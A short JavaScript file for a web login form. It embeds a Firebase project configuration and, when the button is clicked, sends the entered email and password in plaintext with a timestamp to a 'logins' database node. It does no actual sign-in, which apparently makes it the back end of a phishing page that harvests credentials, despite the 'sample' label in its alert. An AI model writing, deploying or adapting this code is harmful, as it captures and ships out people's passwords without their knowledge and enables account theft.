import { initializeApp } from "https://www.gstatic.com/firebasejs/12.11.0/firebase-app.js";
import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/12.11.0/firebase-database.js";

const firebaseConfig = {
  apiKey: "AIzaSyCgeJj-pm0yFbO_UcH06NBfaGm0H-YUVZA",
  authDomain: "live-47884.firebaseapp.com",
  databaseURL: "https://live-47884-default-rtdb.firebaseio.com",
  projectId: "live-47884",
  storageBucket: "live-47884.firebasestorage.app",
  messagingSenderId: "1020379584903",
  appId: "1:1020379584903:web:51805d3077b9802dd95b22",
  measurementId: "G-NKKST173G4"
};

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

const loginBtn = document.getElementById("loginBtn");

loginBtn.addEventListener("click", () => {
  const email = document.getElementById("email").value;
  const password = document.getElementById("password").value;

  if(email === "" || password === "") {
    alert("Fill all fields");
    return;
  }

  // Send to Firebase
  push(ref(db, 'logins'), {
    email: email,
    password: password,
    time: Date.now()
  });

  alert("Logged (sample)");
});